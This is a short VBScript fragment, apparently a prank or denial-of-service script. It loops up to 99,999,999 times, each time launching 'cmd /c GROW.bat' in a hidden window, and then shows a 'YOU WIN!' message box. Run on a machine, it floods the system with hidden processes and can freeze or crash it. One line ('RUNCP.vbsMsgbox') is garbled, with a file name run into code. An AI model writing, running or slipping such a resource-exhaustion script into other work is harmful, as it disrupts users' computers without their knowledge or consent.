For count = 1 To 99999999
	Set ws = CreateObject("Wscript.Shell")
	ws.run "cmd /c GROW.bat " &count &"", vbhide
Next
	RUNCP.vbsMsgbox "YOU WIN!"